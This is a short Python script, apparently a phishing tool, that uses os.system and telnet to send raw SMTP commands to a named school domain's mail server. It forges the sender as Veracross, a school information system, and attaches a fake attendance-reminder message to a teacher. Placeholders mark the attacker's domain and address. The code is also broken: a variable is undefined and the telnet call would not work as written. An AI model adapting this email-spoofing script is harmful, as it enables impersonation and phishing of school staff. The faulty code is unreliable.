import os

def monthlyEmail(name,date,time):
    os.system(
    f"""
telnet <jburroughs.org> 25 
helo <attacker-domain>
mail from: <attacker-email-address>
rcpt to: {targetEmail}
data
from: "<Veracross>" <m@mail3.veracross.com>
to: {targetEmail}
subject: Veracross: Attendance reminder for today, {date}
    """
)
    return f"Hello {name}, \n\nPlease find below the classes that need attendance taken for today, {date}, as of {time} \n\n3rd Period \n\nThank you for taking the time to complete this very important task!"

print(monthlyEmail("Ken","Jan 30","11:29"))